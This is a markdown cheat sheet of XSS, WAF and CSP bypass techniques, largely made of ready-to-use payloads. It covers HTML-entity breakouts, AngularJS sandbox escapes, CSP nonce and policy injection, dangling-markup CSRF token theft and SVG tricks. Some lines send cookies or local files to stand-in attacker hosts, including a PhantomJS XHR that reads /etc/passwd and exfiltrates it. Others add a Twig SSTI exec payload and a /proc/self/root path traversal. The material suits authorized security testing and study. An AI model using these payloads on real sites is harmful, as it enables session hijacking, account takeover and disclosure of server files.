# XSS Bypass Techniques - Complete Reference

## Overview

This comprehensive guide covers Web Application Firewall (WAF) bypass techniques, filter evasion methods, and advanced XSS exploitation strategies for real-world security testing.

---

## Table of Contents

1. [HTML Encoding Bypass](#html-encoding-bypass)
2. [Character Set Manipulation](#character-set-manipulation)
3. [WAF Bypass Strategies](#waf-bypass-strategies)
4. [SVG-Based Bypasses](#svg-based-bypasses)
5. [AngularJS Sandbox Escapes](#angularjs-sandbox-escapes)
6. [CSP Bypass Techniques](#csp-bypass-techniques)
7. [Template Injection](#template-injection)
8. [Alternative Event Handlers](#alternative-event-handlers)
9. [Custom Tags Exploitation](#custom-tags-exploitation)
10. [Advanced Encoding Techniques](#advanced-encoding-techniques)

---

## HTML Encoding Bypass

### Context: HTML Attributes with Decoders

**Vulnerability**: When input is reflected in an HTML attribute that's decoded before JavaScript execution.

**Technique**: Use HTML entities that browsers decode before JavaScript parsing.

### Example

**Vulnerable Pattern**:
```html
<a onclick="var x='USER_INPUT'">Click</a>
```

**Attack**:
```
Input: &apos;-alert(1)-&apos;
Reflected: <a onclick="var x='&apos;-alert(1)-&apos;'">
Decoded by browser: <a onclick="var x=''-alert(1)-''">
```

**Why It Works**:
1. HTML entity decoding happens BEFORE JavaScript parsing
2. `&apos;` becomes `'` at HTML level
3. JavaScript parser sees closed string
4. alert(1) executes as code

### Common HTML Entities for Bypass

```
&apos;  → '  (single quote)
&quot;  → "  (double quote)
&lt;    → <  (less than)
&gt;    → >  (greater than)
&#x27;  → '  (single quote hex)
&#x22;  → "  (double quote hex)
&#39;   → '  (single quote decimal)
&#34;   → "  (double quote decimal)
```

### Payload Examples

**Breaking out of single-quoted attribute**:
```javascript
&apos;-alert(1)-&apos;
&#x27;-alert(1)-&#x27;
&#39;-alert(1)-&#39;
```

**Breaking out of double-quoted attribute**:
```javascript
&quot;-alert(1)-&quot;
&#x22;-alert(1)-&#x22;
&#34;-alert(1)-&#34;
```

### Full Context Example

**Example**: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded

**Vulnerable Code**:
```html
<a onclick="this.setAttribute('href','http://USER_INPUT')">
```

**Working Payload**:
```
http://attacker.com&apos;);alert(1);//
```

**Rendered HTML**:
```html
<a onclick="this.setAttribute('href','http://attacker.com&apos;);alert(1);//')">
```

**After HTML Entity Decoding**:
```html
<a onclick="this.setAttribute('href','http://attacker.com');alert(1);//')">
```

---

## Character Set Manipulation

### Case Variation

**Context**: Case-sensitive filters

**Technique**: Mix uppercase and lowercase to bypass string matching

**Examples**:
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
<SvG OnLoAd=alert(1)>
<BoDy OnLoAd=alert(1)>
<IFrAmE src="javascript:alert(1)">
```

**Why It Works**:
- HTML tags and attributes are case-insensitive
- Simple blacklist filters often match specific case
- Browser normalizes tag names before processing

### Space Bypass

**Context**: Filters that block space characters

**Techniques**:

**1. Forward Slash**:
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

**2. Tab Character** (URL-encoded: %09):
```html
<img%09src=x%09onerror=alert(1)>
<img    src=x   onerror=alert(1)>  <!-- literal tabs -->
```

**3. Newline** (URL-encoded: %0A or %0D):
```html
<img%0Asrc=x%0Aonerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
```

**4. Comment (in JavaScript)**:
```html
<img/**/src=x/**/onerror=alert(1)>
```

**5. NULL byte** (works in some contexts):
```html
<img%00src=x%00onerror=alert(1)>
```

### Quote Bypass

**Context**: Filters blocking quote characters

**Techniques**:

**1. No Quotes Needed**:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**2. Backticks (template literals)**:
```html
<img src=`x` onerror=`alert(1)`>
```

**3. Mix Quote Types**:
```html
<img src='x' onerror="alert(1)">
<img src="x" onerror='alert(1)'>
```

### Parentheses Bypass

**Context**: Filters blocking parentheses

**Techniques**:

**1. onerror with throw**:
```javascript
onerror=alert;throw 1
```

**2. Template literal tag function**:
```html
<svg onload=alert`1`>
```

**3. Exception-based execution**:
```javascript
onerror=alert;throw 1337
```

### Semicolon Bypass

**Context**: Filters blocking semicolons

**Techniques**:

**1. Arithmetic operators**:
```javascript
'-alert(1)-'
'+alert(1)+'
'*alert(1)*'
```

**2. Comma operator**:
```javascript
',alert(1)//'
```

**3. Newline**:
```javascript
'
alert(1)//
```

---

## WAF Bypass Strategies

### Systematic Enumeration with Burp Intruder

**Example**: Reflected XSS with some SVG markup allowed

**Methodology**:

**Phase 1: Enumerate Allowed Tags**

1. **Setup Intruder**:
   - Position: `/?search=<§§>`
   - Attack type: Sniper
   - Payload type: Simple list

2. **Load Tag Payloads**:
   ```
   script
   img
   svg
   body
   iframe
   object
   embed
   animate
   animatetransform
   video
   audio
   [... full list from XSS cheat sheet]
   ```

3. **Run Attack and Filter**:
   - Sort by Status Code
   - Status 200 = Allowed
   - Status 400/403 = Blocked

4. **Identify Allowed Tags**:
   ```
   ✓ svg
   ✓ animatetransform
   ✓ title
   ✓ image
   ```

**Phase 2: Enumerate Allowed Attributes**

1. **Setup for Attributes**:
   - Position: `/?search=<svg><animatetransform §§=1>`
   - Load event handler payloads

2. **Event Handler Payloads**:
   ```
   onload
   onerror
   onclick
   onmouseover
   onbegin
   onend
   onrepeat
   [... full event handler list]
   ```

3. **Identify Allowed Events**:
   ```
   ✓ onbegin
   ```

**Phase 3: Construct Exploit**:
```html
<svg><animatetransform onbegin=alert(1)>
```

### WAF Evasion Techniques

**1. Tag Fragmentation**:
```html
<!-- HTML comments -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>

<!-- Newlines -->
<scri
pt>alert(1)</script>
```

**2. Character Insertion**:
```html
<!-- NULL byte (limited browser support) -->
<scri\x00pt>alert(1)</script>
```

**3. Alternate Syntax**:
```html
<!-- Self-closing tags -->
<script src=//attacker.com/x.js />

<!-- No closing tag -->
<img src=x onerror=alert(1)>
```

**4. Polyglot Payloads** (work in multiple contexts):
```javascript
javascript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

---

## SVG-Based Bypasses

### SVG Tags and Events

SVG elements provide numerous bypass opportunities when standard HTML tags are blocked.

### Allowed SVG Tags

```html
<svg>
<animate>
<animatetransform>
<animatemotion>
<set>
<image>
<foreignobject>
<title>
<desc>
<use>
```

### SVG Event Handlers

```html
onbegin
onend
onrepeat
onload (on svg root)
```

### SVG Exploitation Techniques

**1. Basic SVG XSS**:
```html
<svg onload=alert(1)>
```

**2. Nested SVG Elements**:
```html
<svg><animate onbegin=alert(1)>
<svg><animatetransform onbegin=alert(1)>
```

**3. SVG with Anchor**:
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

**4. SVG foreignObject**:
```html
<svg><foreignobject><body onload=alert(1)></foreignobject></svg>
```

### Example

**Challenge**: Event handlers and href attributes blocked

**Challenge**: Standard event handlers and href blocked

**Solution**: Use SVG animate to dynamically set href
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
```

**Why It Works**:
- `animate` element modifies attributes dynamically
- Filter checks static `href=` patterns
- Dynamic attribute setting bypasses filter
- Requires click on text to trigger

---

## AngularJS Sandbox Escapes

### Understanding AngularJS Sandbox

**Context**: AngularJS versions < 1.6 had sandboxing to restrict expression capabilities

**Purpose**: Prevent malicious code execution in templates

**Limitation**: Sandbox can be bypassed

### Basic AngularJS Expression

**Vulnerable Pattern**:
```html
<body ng-app>
<div>{{USER_INPUT}}</div>
</body>
```

**Basic Payloads**:
```javascript
{{1+1}}  // Test if AngularJS active (displays 2)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### Sandbox Escape Techniques

**1. Constructor Chain**:
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Breakdown**:
- `constructor` → Object's constructor function
- `.constructor` → Function constructor
- `('alert(1)')` → Code as string
- `()` → Execute

**2. Using $on**:
```javascript
{{$on.constructor('alert(1)')()}}
```

**3. Using toString**:
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

### Advanced: Sandbox Escape Without Strings

**Example**: Reflected XSS with AngularJS sandbox escape without strings

**Challenge**: Cannot use string literals (quotes blocked)

**Solution**:
```javascript
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Breakdown**:

1. **Corrupt charAt**:
   ```javascript
   toString().constructor.prototype.charAt=[].join
   ```
   - Overwrites charAt on String prototype
   - Breaks sandbox's string validation

2. **Build string from character codes**:
   ```javascript
   toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
   ```
   - Character codes: `120=x, 61==, 97=a, 108=l, 101=e, 114=r, 116=t, 40=(, 49=1, 41=)`
   - Result: `x=alert(1)`

3. **Execute via orderBy**:
   ```javascript
   [1]|orderBy:[constructed_string]
   ```
   - orderBy filter processes expression
   - Evaluates constructed string
   - Executes `alert(1)`

### ng-include Same-Origin XHR Exploit

When AngularJS is present (any version) and the attacker controls HTML in a template context, `ng-include` can fetch ANY same-origin URL and render it into the DOM as an AngularJS template. This is a primitive for reading/triggering same-origin URLs with the victim's session.

**Payload**:
```html
<div ng-app ng-include="'/admin/some-endpoint'"></div>
<!-- or to chain into a CSRF-able action triggering a server-side OAuth callback: -->
<div ng-app ng-include src="'/accounts/oauth2/provider/callback/?code=ATTACKER_CODE'"></div>
```

Key properties:
- Loads the URL with the victim's cookies (same-origin XHR).
- Response is parsed as an Angular template — any embedded Angular expressions also execute, chaining into sandbox escape.
- Works under strict CSP that forbids inline scripts as long as `ng-include` / Angular directives are allowed (which they are, since Angular itself is allowed).
- Useful when attacker has stored HTML injection but not full JS (e.g. user bio / comment that strips `<script>` but not Angular directives).

Typical chain: stored HTML injection with Angular directives -> admin views page -> `ng-include` fetches admin-only endpoint (or triggers OAuth re-linking callback, CSRF-protected state-changing GET, etc.) with admin session cookies.

### AngularJS CSP Bypass

**Example**: Reflected XSS with AngularJS sandbox escape and CSP

**Challenge**: CSP blocks inline scripts, AngularJS sandbox active

**Solution**:
```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)' autofocus>#x
```

**Breakdown**:

1. **ng-focus directive**: Triggers on focus
2. **$event.composedPath()**: Returns event path array (includes window)
3. **orderBy filter**: Processes the array
4. **(z=alert)(document.cookie)**: Assigns alert to z, then calls it
5. **autofocus**: Auto-focuses element
6. **#x**: URL hash focuses element with id=x

**Why It Works**:
- CSP allows event handlers (not inline `<script>`)
- ng-focus is an AngularJS directive, not blocked by CSP
- Expression evaluation within directive bypasses sandbox
- Variable assignment `(z=alert)` bypasses filter

---

## CSP Bypass Techniques

### CSP Nonce Reuse / Stale Nonce

**Context**: CSP uses `script-src 'nonce-xxx'` but the nonce value is static, cached, or predictable.

**Detection**:
1. Make 3+ requests to the same page — compare the nonce value each time
2. If nonce is identical across requests, it's **static** (trivially bypassable)
3. Check if nonce appears in cached responses (CDN, reverse proxy)
4. Check if nonce is derived from predictable values (timestamp, session ID)

**Exploit** (static nonce):
```html
<!-- Read nonce from page source, inject script with same nonce -->
<script nonce="STATIC_NONCE_VALUE">alert(document.cookie)</script>
```

**Exploit** (nonce in cached response):
```html
<!-- Fetch the page to extract nonce, then inject with that nonce -->
<script>
fetch('/page').then(r=>r.text()).then(t=>{
  const nonce = t.match(/nonce="([^"]+)"/)[1];
  const s = document.createElement('script');
  s.nonce = nonce;
  s.textContent = 'alert(document.cookie)';
  document.body.appendChild(s);
});
</script>
```

**Why It Works**: CSP nonces are designed to be unique per-response. When reused, any XSS injection point can simply include the known nonce value.

### CSP Policy Injection

**Example**: Reflected XSS protected by CSP, with CSP bypass

**Vulnerable CSP**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=USER_CONTROLLED
```

**Exploit**: Inject additional directive via token parameter
```
token=;script-src-elem 'unsafe-inline'
```

**Result**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
```

**Why It Works**:
- Semicolon terminates report-uri directive
- `script-src-elem` is more specific than `script-src`
- More specific directives take precedence
- `'unsafe-inline'` allows inline scripts

**Full Exploit URL**:
```
https://target.com/?search=<script>alert(1)</script>&token=;script-src-elem%20'unsafe-inline'
```

### Dangling Markup for CSP Bypass

**Example**: Reflected XSS protected by very strict CSP, with dangling markup attack

**Strict CSP**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

**Problem**: CSP blocks all inline scripts

**Missing Directive**: No `form-action` directive

**Exploit**: Form hijacking to exfiltrate CSRF token

**Phase 1: Button Injection**
```html
<button formaction="https://exploit-server.com" formmethod="get">Click me</button>
```

**Phase 2: Extract CSRF Token**
```html
email=foo"><button formaction="https://exploit-server.com/exploit" formmethod="get">Click me</button>
```

**Phase 3: Two-Stage Exploit**

```javascript
const academyFrontend = "https://target.com/";
const exploitServer = "https://exploit-server.com/exploit";
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    // Stage 2: Have token, change email
    const form = document.createElement('form');
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;

    const emailInput = document.createElement('input');
    emailInput.name = 'email';
    emailInput.value = 'hacker@evil.com';

    const tokenInput = document.createElement('input');
    tokenInput.name = 'csrf';
    tokenInput.value = csrf;

    form.append(emailInput, tokenInput);
    document.documentElement.append(form);
    form.submit();
} else {
    // Stage 1: No token yet, inject button to steal it
    location = `${academyFrontend}my-account?email=foo"><button formaction="${exploitServer}" formmethod="get">Click me</button>`;
}
```

**Why It Works**:
- CSP blocks JavaScript
- But doesn't restrict form submissions (no `form-action`)
- Form GET request exposes CSRF token in URL
- Exploit server receives token via query parameter
- Second stage uses token to change email

### JSONP Endpoints for CSP Bypass

**Concept**: If CSP whitelists certain domains, find JSONP endpoints on those domains

**Example CSP**:
```http
Content-Security-Policy: script-src 'self' https://trusted-site.com
```

**If trusted-site.com has JSONP**:
```html
<script src="https://trusted-site.com/jsonp?callback=alert"></script>
```

### CDN Allowlist Bypass via npm Packages

**Concept**: When CSP whitelists an entire CDN origin (e.g., `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, `unpkg.com`), any npm package hosted there can be loaded — including packages designed to bypass CSP.

**Example CSP**:
```http
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net
```

**Key Package**: `csp-bypass` on npm provides multiple bypass variants:
- `classic.js` — Uses `eval()` (fails if CSP lacks `'unsafe-eval'`)
- **`sval-classic.js`** — Bundles a full JS interpreter (sval), bypasses `eval()` restriction
- Both scan DOM for elements with `csp` or `csp-base64` attributes and execute the content

**Payload (with eval restriction)**:
```html
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js"></script>
<br csp-base64="BASE64_ENCODED_JS_PAYLOAD">
```

**Payload (without eval restriction)**:
```html
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/classic.js"></script>
<br csp="fetch('https://attacker.com?c='+document.cookie)">
```

**Why It Works**:
- CDN allowlist permits loading ANY package from the CDN
- `sval-classic.js` interprets JS without `eval()`, so `'unsafe-eval'` is not needed
- Attacker embeds JS in a DOM attribute, sval reads and executes it
- Works for stored XSS where bot/victim visits page with injected content

**Checklist when encountering CDN in CSP**:
1. Check if `connect-src` is set — if absent (and no `default-src`), outbound fetch is unrestricted
2. Use `sval-classic.js` variant (not `classic.js`) when `'unsafe-eval'` is missing
3. Base64-encode the payload in `csp-base64` attribute for cleaner injection
4. Exfiltrate via `fetch()` to webhook/collaborator if `connect-src` is open
5. Use `document.location` redirect as fallback if `connect-src` blocks fetch

### Base Tag Hijacking

**Concept**: If CSP doesn't restrict `base-uri`, inject base tag

**Payload**:
```html
<base href="https://attacker.com/">
```

**Result**: All relative script/style URLs load from attacker's domain

---

## Template Injection

### JavaScript Template Literals

**Context**: Input reflected in ES6 template literal

**Vulnerable Pattern**:
```javascript
var msg = `Hello ${USER_INPUT}`;
```

**Exploitation**:
```javascript
${alert(1)}
${alert(document.domain)}
${fetch('//attacker.com?c='+document.cookie)}
```

**Example**: Reflected XSS into a template literal

**Solution**:
```
/?search=${alert(1)}
```

**Why It Works**:
- Template literals evaluate `${}` as JavaScript expressions
- No escaping applied to expression syntax
- Runs in same scope as template literal

### Server-Side Template Injection

**Different from XSS**, but related:

**Jinja2 (Python)**:
```python
{{7*7}}  # Test injection
{{config.items()}}  # Expose config
```

**Twig (PHP)**:
```php
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## Alternative Event Handlers

### Common Event Handlers
```html
onclick, ondblclick, onmousedown, onmouseup, onmouseover,
onmousemove, onmouseout, onmouseenter, onmouseleave
```

### Less Common (Often Bypass Filters)
```html
<!-- Focus events -->
onfocus, onblur, onfocusin, onfocusout

<!-- Form events -->
onsubmit, onreset, oninput, onchange, oninvalid, onsearch

<!-- Keyboard events -->
onkeypress, onkeydown, onkeyup

<!-- Media events -->
onloadstart, onprogress, oncanplay, onplay, onpause

<!-- Animation events -->
onanimationstart, onanimationend, onanimationiteration

<!-- Transition events -->
ontransitionend, ontransitionrun, ontransitionstart

<!-- Wheel/Scroll -->
onwheel, onscroll

<!-- Touch (mobile) -->
ontouchstart, ontouchend, ontouchmove

<!-- SVG-specific -->
onbegin, onend, onrepeat

<!-- Other -->
onresize, onhashchange, onpageshow, onpagehide
```

### Automatic Trigger Events

**No user interaction needed**:
```html
<body onload=alert(1)>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<iframe onload=alert(1)>
```

---

## Custom Tags Exploitation

**Example**: Reflected XSS with all standard tags blocked except custom ones

**Concept**: Application blocks standard HTML tags but allows custom tags

**Exploit**:
```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

**Breakdown**:
- `<xss>` → Custom tag (not in blacklist)
- `id=x` → Element identifier
- `onfocus=alert(document.cookie)` → Event handler
- `tabindex=1` → Makes element focusable
- `#x` → URL hash auto-focuses element

**Delivery via Exploit Server**:
```html
<script>
location = 'https://target.com/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

**Why It Works**:
- Blacklist only contains standard HTML tags
- Custom tags are valid HTML5 elements
- Can have event handlers
- `tabindex` makes any element focusable
- Hash-based auto-focus triggers event

---

## Advanced Encoding Techniques

### Double Encoding

**Concept**: Application decodes input twice

**Example**:
```
Original:  <script>
URL:       %3Cscript%3E
Double:    %253Cscript%253E

After first decode: %3Cscript%3E
After second decode: <script>
```

### Unicode Encoding

```html
<!-- Unicode escape -->
<script\u003Ealert(1)</script>

<!-- HTML entity -->
<script&#x3E;alert(1)</script>

<!-- Overlong UTF-8 (usually blocked) -->
%C0%BC  → < (overlong encoding)
```

### Mutation XSS (mXSS)

**Concept**: Browser mutates sanitized HTML

**Example**:
```html
<!-- Input -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After sanitizer -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After browser mutation -->
<p title="</noscript><img src=x onerror=alert(1)>">
```

---

## HTML Sanitizer Entity Bypass via Downstream Decoding

When an app uses a sanitizer (e.g., `sanitize-html`) that preserves HTML entities, but a downstream component (e.g., `node-html-markdown`, a Markdown converter, or a headless browser) decodes those entities before processing:

```
Input:  <img src=x onerror=alert(1)>
Sanitizer output: &lt;img src=x onerror=alert(1)&gt;  (safe — entities preserved)
Downstream decode: <img src=x onerror=alert(1)>        (unsafe — entities decoded!)
```

### Exploitation Chain
1. Sanitizer converts `<` to `&lt;` and considers it safe
2. Downstream component (Markdown parser, template engine, headless browser) decodes `&lt;` back to `<`
3. Result is rendered as active HTML/JavaScript

### Common Vulnerable Chains
- `sanitize-html` + `node-html-markdown` (converts HTML to Markdown, decodes entities first)
- `DOMPurify` + server-side rendering that re-parses output
- Any sanitizer + PhantomJS/headless Chrome that loads sanitized content as HTML

### PhantomJS file:// Read via XSS
When XSS executes in PhantomJS (used for PDF generation, screenshots, etc.):
```javascript
// XHR to read local files:
var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();
// Exfiltrate via img src or fetch to attacker server
new Image().src='http://attacker.com/?data='+btoa(x.responseText);
```

**Key insight**: Always check if sanitized output is consumed by another parser/renderer. Entity-safe output is only safe if ALL downstream consumers treat entities as literal text.

---

## Multiline Regex Bypass

JavaScript regex with `/m` flag changes `^` and `$` to match line boundaries instead of string boundaries:

```javascript
// Vulnerable validation:
if (/^[0-9]+$/m.test(input)) { /* "safe" numeric input */ }

// Bypass with newline:
"123
alert(1)"  // "123" matches ^[0-9]+$ on first line, rest is ignored

// URL-encoded: 123%0aalert(1)
```

### Related: Array.includes() Type Confusion
```javascript
// Vulnerable check:
if (blacklist.includes(input)) { reject(); }

// Bypass: if input is an array instead of string, includes() always returns false
// Send ?param[]=value instead of ?param=value
// Express parses ?param[]=value as array, not string
```

### /proc/PID/root Path Padding
When path length is validated with `.slice()` or `.substring()`:
```
// /proc/self/root is a symlink to /
// Pad the path to exactly the expected length:
/proc/self/root/proc/self/root/proc/self/root/etc/passwd
// .slice(0, N) truncates but the path still resolves through symlinks
```

---

## References

1. **XSS Cheat Sheet**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
2. **OWASP XSS Filter Evasion**: https://owasp.org/www-community/xss-filter-evasion-cheatsheet
3. **HTML5 Security Cheatsheet**: https://html5sec.org/
4. **AngularJS Sandbox Escapes**: https://portswigger.net/research/dom-based-angularjs-sandbox-escapes

---

**Document Version**: 1.0
**Last Updated**: January 9, 2026
**Source**: Real-world scenarios & security research
